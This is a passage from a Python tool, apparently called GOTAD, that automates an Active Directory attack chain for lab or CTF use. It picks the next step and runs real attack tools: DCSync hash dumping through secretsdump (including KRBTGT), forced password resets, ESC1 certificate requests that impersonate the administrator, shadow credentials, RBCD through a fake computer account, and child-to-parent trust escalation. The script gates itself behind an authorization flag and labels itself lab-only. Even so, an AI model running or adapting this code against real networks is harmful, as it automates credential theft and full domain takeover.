                 "--user", st.best.user, "--password", st.best.password],
                timeout=120,
            )
        st.next_manual.append("mssql.md — EXEC AT [LINK] then BloodHound in the other domain")
        st.mark("mssql")
        return True
    st.mark("mssql")
    return False


def act_trusts(st: State) -> bool:
    if not st.best:
        st.mark("trusts")
        return False
    nxc = which("nxc", "netexec")
    if nxc:
        blob = run([nxc, "ldap", st.dc, *auth_args(st), "--trusts"], timeout=60)
        for m in RE_TRUST.finditer(blob):
            if m.group("name") not in st.trusts:
                st.trusts.append(m.group("name"))
    if st.trusts:
        st.note("trusts: " + ", ".join(st.trusts))
        st.next_manual.append("Child DA + extra-SID 519 if SID filtering is off. Else foreign group / ADCS.")
        st.mark("trusts")
        return True
    print("[*] single domain / no trusts advertised")
    st.mark("trusts")
    return False


def act_dcsync(st: State) -> bool:
    if not st.best:
        print("[!] no cred to DCSync")
        st.mark("dcsync")
        return False
    dump = which("impacket-secretsdump", "secretsdump.py")
    if not dump:
        print("[!] secretsdump missing")
        st.mark("dcsync")
        return False
    if st.best.role not in {"da", "ea", "admin"}:
        print(f"[*] best cred is {st.best.role} — trying DCSync anyway (may fail)")
    out = LOOT / "hashes" / "ntds.ntds"
    if st.best.password:
        target = f"{st.domain}/{st.best.user}:{st.best.password}@{st.dc}"
        blob = run([dump, target, "-just-dc-ntlm", "-outputfile", str(out)], timeout=300)
    elif st.best.nthash:
        blob = run(
            [dump, f"{st.domain}/{st.best.user}@{st.dc}", "-hashes", f":{st.best.nthash}",
             "-just-dc-ntlm", "-outputfile", str(out)],
            timeout=300,
        )
    else:
        st.mark("dcsync")
        return False
    dumped = "krbtgt" in blob.lower() or "Dumping Domain Credentials" in blob
    ntds_out = LOOT / "hashes" / "ntds.ntds"
    if ntds_out.exists() and "krbtgt" in ntds_out.read_text(errors="ignore").lower():
        dumped = True
    if dumped:
        st.takeover = True
        st.note("DCSync KRBTGT")
        for m in RE_NTDS.finditer(blob):
            user = m.group("user").split("\\")[-1]
            if user.lower() == "krbtgt":
                st.add_cred(Cred("krbtgt", nthash=m.group("nt"), role="da", source="dcsync"), "KRBTGT")
        print("[+] DCSync succeeded")
        st.mark("dcsync")
        return True
    print("[*] DCSync denied — not DA / no DS-Replication")
    st.next_manual.append("Need DA or DS-Replication. Follow ACL / ADCS / delegation, then --from dcsync.")
    st.mark("dcsync")
    return False


def act_shadow(st: State) -> bool:
    if not st.best or not st.best.password:
        st.mark("shadow")
        return False
    targets = []
    for e in st.bh_edges:
        if e.get("kind") == "users" and e.get("right", "").upper().replace(" ", "") in {
            "GENERICWRITE", "GENERICALL", "WRITEACCOUNTRESTRICTIONS",
        }:
            targets.append(e["dst"].split("@")[0])
    for e in st.edges:
        if e.get("right", "").lower() in {"genericwrite", "genericall"}:
            m = re.search(r"([A-Za-z0-9._-]+)@|CN=([^,]+)", e.get("raw", ""), re.I)
            if m:
                targets.append(m.group(1) or m.group(2))
    targets = [t for t in dict.fromkeys(targets) if t and t.lower() != st.best.user.lower()]
    if not targets:
        print("[*] no GenericWrite-on-user edge")
        st.mark("shadow")
        return False
    target = targets[0].split("\\")[-1]
    print(f"[*] shadow candidate {target}")
    st.next_manual.append(f"certipy shadow auto -u {st.best.user}@{st.domain} -p '{st.best.password}' -account {target} -dc-ip {st.dc}")
    st.note(f"shadow {target}")
    st.mark("shadow")
    return True


def act_rbcd(st: State) -> bool:
    if not st.best or not st.best.password:
        st.mark("rbcd")
        return False
    comps = []
    for e in st.bh_edges:
        r = e.get("right", "").upper().replace(" ", "")
        if e.get("kind") == "computers" and r in {
            "GENERICWRITE", "GENERICALL", "ADDALLOWEDTOACT", "WRITEACCOUNTRESTRICTIONS",
        }:
            comps.append(e["dst"].split("@")[0])
    if not comps and st.maq and st.maq > 0:
        print("[*] no computer write, but MAQ>0 — can RBCD after addcomputer on a target you coerce")
        st.next_manual.append("tickets.md — addcomputer FAKE$ then rbcd on a host you write / relay")
        st.mark("rbcd")
        return True
    if not comps:
        print("[*] no RBCD edge")
        st.mark("rbcd")
        return False
    target = comps[0].rstrip("$")
    st.next_manual.append(
        f"bloodyAD --host {st.dc} -d {st.domain} -u {st.best.user} -p '{st.best.password}' "
        f"add rbcd {target}$ FAKE$   # after addcomputer"
    )
    st.next_manual.append(
        f"impacket-getST -spn cifs/{target}.{st.domain} -impersonate Administrator "
        f"-dc-ip {st.dc} {st.domain}/FAKE$:'LabOnly!1'"
    )
    st.note(f"RBCD {target}")
    st.mark("rbcd")
    return True


def act_trusthop(st: State) -> bool:
    if not st.best:
        st.mark("trusthop")
        return False
    if not st.trusts:
        print("[*] no trusts — single domain")
        st.mark("trusthop")
        return False
    print("[*] trusts: " + ", ".join(st.trusts))
    if st.best.role in {"da", "ea"}:
        child = st.domain
        st.next_manual.append(f"impacket-raiseChild {child}/{st.best.user}:'{st.best.password or st.best.nthash}'")
        st.next_manual.append("If forest trust (SID filter ON): mssql.md / certipy.md, do not extra-SID")
        st.note("trust hop ready")
    else:
        st.next_manual.append("Need DA in this domain before raiseChild. Forest trust → other-side roast / SQL / ADCS.")
    st.mark("trusthop")
    return bool(st.trusts)


def act_abuse(st: State) -> bool:
    """Opt-in lab abuse: FCP, ESC1, shadow, addcomputer."""
    if not st.best or not st.best.password:
        st.mark("abuse")
        return False
    progressed = False
    fcp = next((e for e in st.edges if e["right"].lower() == "forcechangepassword"), None)
    if not fcp:
        fcp = next((e for e in st.bh_edges if e.get("right", "").lower() == "forcechangepassword"), None)
        target = fcp["dst"].split("@")[0] if fcp else None
    else:
        target = None
        m = re.search(r"([A-Za-z0-9._-]+)@|CN=([^,]+)", fcp["raw"], re.I)
        if m:
            target = m.group(1) or m.group(2)
    if target:
        ch = which("impacket-changepasswd", "changepasswd.py")
        if ch:
            print(f"[abuse] ForceChangePassword → {target} (lab password LabOnly!1)")
            run(
                [
                    ch, f"{st.domain}/{st.best.user}:{st.best.password}@{st.dc}",
                    "-newpass", "LabOnly!1", "-user", target,
                ],
                timeout=40,
            )
            st.add_cred(Cred(target, password="LabOnly!1", role="user", source="abuse"), f"reset {target}")
            progressed = True
    if "1" in st.esc:
        cert = which("certipy", "certipy-ad")
        if cert:
            print("[abuse] ESC1 request for administrator UPN")
            run(
                [
                    cert, "req", "-u", f"{st.best.user}@{st.domain}", "-p", st.best.password,
                    "-dc-ip", st.dc, "-template", "ESC1", "-upn", f"administrator@{st.domain}",
                ],
                timeout=90,
            )
            st.next_manual.append("certipy auth -pfx administrator.pfx -dc-ip " + st.dc)
            progressed = True
    shadows = [e for e in st.bh_edges if e.get("kind") == "users" and e.get("right", "").upper() in {"GENERICWRITE", "GENERICALL"}]
    if shadows:
        cert = which("certipy", "certipy-ad")
        tgt = shadows[0]["dst"].split("@")[0]
        if cert:
            print(f"[abuse] shadow auto {tgt}")
            run(
                [cert, "shadow", "auto", "-u", f"{st.best.user}@{st.domain}", "-p", st.best.password,
                 "-account", tgt, "-dc-ip", st.dc],
                timeout=90,
            )
            progressed = True
    if st.maq and st.maq > 0:
        addc = which("impacket-addcomputer", "addcomputer.py")
        if addc:
            print("[abuse] addcomputer FAKE$ (MAQ)")
            run(
                [addc, f"{st.domain}/{st.best.user}:{st.best.password}",
                 "-computer-name", "FAKE$", "-computer-pass", "LabOnly!1", "-dc-ip", st.dc],
                timeout=40,
            )
            st.add_cred(Cred("FAKE$", password="LabOnly!1", role="svc", source="maq"), "MAQ FAKE$")
            progressed = True
    st.mark("abuse")
    return progressed


ACTIONS = {
    "box": act_box,
    "recon": act_recon,
    "unauth": act_unauth,
    "asrep": act_asrep,
    "spray": act_spray,
    "kerberoast": act_kerberoast,
    "bloodhound": act_bloodhound,
    "lateral": act_lateral,
    "acl": act_acl,
    "laps": act_laps,
    "maq": act_maq,
    "shadow": act_shadow,
    "rbcd": act_rbcd,
    "delegation": act_delegation,
    "adcs": act_adcs,
    "sysvol": act_sysvol,
    "mssql": act_mssql,
    "trusts": act_trusts,
    "trusthop": act_trusthop,
    "dcsync": act_dcsync,
    "abuse": act_abuse,
}


def decide(st: State, abuse: bool) -> Optional[str]:
    """Pick the single most useful next action. None = stop."""
    if st.takeover:
        return None
    if not st.has("box"):
        return "box"
    if not st.has("recon"):
        return "recon"
    if not st.users and not st.has("unauth"):
        return "unauth"
    if not st.best:
        if not st.has("asrep"):
            return "asrep"
        if not st.has("spray"):
            return "spray"
        if not st.has("unauth"):
            return "unauth"
        return None
    if not st.has("bloodhound"):
        return "bloodhound"
    if not st.has("kerberoast"):
        return "kerberoast"
    if not st.has("sysvol"):
        return "sysvol"
    if not st.has("laps"):
        return "laps"
    if not st.has("lateral"):
        return "lateral"
    if not st.has("acl"):
        return "acl"
    if not st.has("maq"):
        return "maq"
    if not st.has("shadow"):
        return "shadow"
    if not st.has("rbcd"):
        return "rbcd"
    if not st.has("adcs"):
        return "adcs"
    if not st.has("delegation"):
        return "delegation"
    if not st.has("mssql"):
        return "mssql"
    if not st.has("trusts"):
        return "trusts"
    if not st.has("trusthop"):
        return "trusthop"
    if abuse and not st.has("abuse") and (st.edges or st.esc or st.bh_edges or (st.maq or 0) > 0):
        return "abuse"
    if not st.has("dcsync"):
        return "dcsync"
    return None


def why(st: State, action: str) -> str:
    reasons = {
        "box": "need a live DC before any roast",
        "recon": "map roles so later steps can skip empty protocols",
        "unauth": "need a user list for AS-REP / spray",
        "asrep": "no cred yet — cheapest foothold",
        "spray": "no cred yet — user=pass / descriptions / seasons",
        "bloodhound": "have a user — collect the graph, then bh-next",
        "kerberoast": "SPNs often crack to a service with local admin",
        "sysvol": "GPP / scripts sometimes hand out a local admin",
        "laps": "ReadLAPS / gMSA blob is a local admin",
        "lateral": "spray the cred, dump LSASS if Pwn3d",
        "acl": "outbound rights beat guessing",
        "maq": "default 10 computer accounts = RBCD principal",
        "shadow": "GenericWrite on a user → PKINIT / NT hash",
        "rbcd": "GenericWrite on a computer → getST Administrator",
        "adcs": "one ESC template can be DA",
        "delegation": "UC / RBCD is a spare DA path",
        "mssql": "linked servers hop forests",
        "trusts": "DA on one domain is not a forest takeover",
        "trusthop": "raiseChild / extra-SID vs forest-filter",
        "abuse": "opt-in: FCP / ESC1 / shadow / addcomputer",
        "dcsync": "best cred is privileged enough to try NTDS",
    }
    return reasons.get(action, "")


def render_report(st: State) -> str:
    lines = [
        "GOTAD report — authorized lab only",
        f"target  {st.domain}  dc={st.dc}  cidr={st.cidr}  profile={st.profile}",
        f"takeover  {st.takeover}",
        "path    " + (" → ".join(st.path) if st.path else "(empty)"),
    ]
    if st.best:
        lines.append(f"best    {st.best.user}  ({st.best.role})  via {st.best.source or '?'}")
    if st.users:
        lines.append(f"users   {len(st.users)}")
    if st.hosts:
        lines.append(f"hosts   {len(st.hosts)}")
    if st.esc:
        lines.append("esc     " + ",".join(st.esc))
    if st.trusts:
        lines.append("trusts  " + ", ".join(st.trusts))
    if st.edges:
        lines.append(f"edges   {len(st.edges)}")
    if st.next_manual:
        lines.append("next manual:")
        for n in st.next_manual:
            lines.append(f"  - {n}")
    return "\n".join(lines) + "\n"


def load_state(st: State) -> None:
    if not STATE.exists():
        return
    try:
        data = json.loads(STATE.read_text())
    except json.JSONDecodeError:
        return
    for k in (
        "domain", "dc", "dc_fqdn", "cidr", "ns", "iface", "profile",
        "creds", "path", "hashes", "users", "descriptions", "hosts",
        "edges", "esc", "trusts", "done", "notes", "next_manual", "lockout",
        "takeover", "bh_edges", "maq",
    ):
        if k in data and data[k] is not None:
            setattr(st, k, data[k])
    if data.get("best"):
        st.best = Cred(**{k: data["best"].get(k, "") for k in ("user", "password", "nthash", "role", "source")})


def self_test() -> int:
    sample = """
SMB         192.168.56.11  445  WINTERFELL  [*] Windows 10 / Server 2019 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.22  445  CASTELBLACK [*] Windows Server 2019 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False)
SMB         192.168.56.11  445  WINTERFELL  [+] north.sevenkingdoms.local\\hodor:hodor
SMB         192.168.56.22  445  CASTELBLACK [+] north.sevenkingdoms.local\\jon.snow:iknownothing (Pwn3d!)
MSSQL       192.168.56.22  1433 CASTELBLACK [*] MSSQL 2019
samwell.tarly    description: Heartsbane
brandon.stark
hodor
Lockout Threshold: None
$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:dead
$krb5tgs$23$*jon.snow$NORTH$HTTP/thewall*$aa
GenericAll on CN=Domain Admins,CN=Users
Template Name : Dothraki
ESC4
CA Name : ESSOS-CA
"""
    hosts = parse_banners(sample)
    assert any(h.ip == "192.168.56.11" and h.domain.endswith("sevenkingdoms.local") for h in hosts), hosts
    assert any(h.signing is False for h in hosts)
    creds = parse_ok_creds(sample)
    assert ("north.sevenkingdoms.local", "hodor", "hodor") in creds
    assert "brandon.stark" in parse_users_loose(sample)
    assert parse_descriptions(sample)["samwell.tarly"] == "Heartsbane"
    assert parse_lockout(sample) is None
    assert RE_ASREP.search(sample).group(1) == "brandon.stark"
    assert RE_TGS.search(sample).group(1) == "jon.snow"
    assert detect_profile("north.sevenkingdoms.local", "auto") == "goad"
    assert guess_cidr("10.10.11.47") == "10.10.11.0/24"
    st = State(dc="192.168.56.11")
    merge_hosts(st, hosts)
    assert st.domain.startswith("north")
    nxt = decide(st, abuse=False)
    assert nxt == "box", nxt
    st.mark("box")
    st.mark("recon")
    assert decide(st, False) == "unauth"
    st.add_users(["hodor"])
    st.mark("unauth")
    assert decide(st, False) == "asrep"
    st.mark("asrep")
    st.mark("spray")
    st.add_cred(Cred("hodor", "hodor", role="user", source="spray"), "spray")
    assert decide(st, False) == "bloodhound"
    print("[self-test] ok")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description="GOTAD authorized-lab AD decision engine")
    ap.add_argument("--i-am-authorized", action="store_true",
                    help="required except for --self-test / --plan with --resume")
    ap.add_argument("--dc", default="", help="DC IP (required unless --resume / --self-test)")
    ap.add_argument("--dc-fqdn", default="")
    ap.add_argument("--domain", default="")
    ap.add_argument("--cidr", default="")
    ap.add_argument("--ns", default="")
    ap.add_argument("--iface", default="eth0")
    ap.add_argument("--user", default="")
    ap.add_argument("--password", default="")
    ap.add_argument("--hash", default="")
    ap.add_argument("--profile", choices=["auto", "goad", "generic"], default="auto")
    ap.add_argument("--from", dest="from_step", default="", help="force this action first")
    ap.add_argument("--only", default="", help="comma list of actions, then stop")
    ap.add_argument("--resume", action="store_true", help="load /loot/auto/state.json")
    ap.add_argument("--plan", action="store_true", help="print the next action, do not run")
    ap.add_argument("--abuse", action="store_true",
                    help="lab-only: act on first ForceChangePassword / ESC1")
    ap.add_argument("--rounds", type=int, default=24, help="max decide() cycles")
    ap.add_argument("--self-test", action="store_true")
    args = ap.parse_args()

    if args.self_test:
        return self_test()

    if not args.i_am_authorized and not args.plan:
        print("[!] refuse: pass --i-am-authorized (lab / RoE only)")
        return 2
    if not args.dc and not args.resume:
        print("[!] need --dc or --resume")
        return 2

    os.environ["GOTAD_LOOT"] = str(LOOT)
    st = State(
        domain=args.domain,
        dc=args.dc,
        dc_fqdn=args.dc_fqdn,
        cidr=args.cidr or (guess_cidr(args.dc) if args.dc else ""),
        ns=args.ns or args.dc,
        iface=args.iface,
        profile=args.profile,
    )
    if args.resume:
        load_state(st)
        if args.dc:
            st.dc = args.dc
    if args.user and (args.password or args.hash):
        st.add_cred(Cred(args.user, args.password, args.hash, role="user", source="supplied"), "supplied cred")
    st.profile = detect_profile(st.domain, args.profile)

    if args.iface in {"tun0", "tun1"}:
        st.notes.append("VPN iface — poison/relay skipped")

    print("GOTAD decision engine — authorized lab / CTF only")
    print(f"target dc={st.dc} domain={st.domain or '(discover)'} cidr={st.cidr} profile={st.profile}")

    if args.plan:
        if args.resume:
            load_state(st)
        nxt = args.from_step or decide(st, args.abuse)
        print(f"[plan] next={nxt or 'stop'}  {why(st, nxt) if nxt else 'nothing left to auto'}")
        print(render_report(st))
        return 0

    only = [x.strip() for x in args.only.split(",") if x.strip()]
    forced = args.from_step

    for i in range(max(1, args.rounds)):
        if st.takeover:
            break
        action = forced or (only[0] if only else decide(st, args.abuse))
        forced = ""
        if only:
            only = only[1:]
        if not action:
            print("[decide] stop — no useful auto step left")
            break
        if action == "poison":
            print("[skip] poison/relay is interactive (responder / ntlmrelayx)")
            st.next_manual.append("Same L2: responder -I {0} -wd / ntlmrelayx".format(st.iface))
            continue
        if action not in ACTIONS:
            print(f"[!] unknown action {action}")
            return 2
        print(f"\n── {action} ──  {why(st, action)}")
        t0 = time.time()
        try:
            ACTIONS[action](st)
        except Exception as exc:  # keep the loop alive
            print(f"[!] {action} crashed: {exc}")
            st.mark(action)
        print(f"[*] {action} {time.time() - t0:.1f}s")
        st.dump()
        if args.only and not only:
            break

    if not st.takeover and st.best and st.best.role in {"user", "svc"}:
        st.next_manual.append("Foothold only. Read BloodHound shortest path, then --from acl|adcs|dcsync.")
    if not st.best:
        st.next_manual.append("No cred. Poison on L2, or a user from the brief / web / guest share.")

    st.dump()
    print("\n── report ──")
    print(render_report(st))
    print(f"state  {STATE}")
    return 0 if st.takeover or st.best else 1


if __name__ == "__main__":
    sys.exit(main())
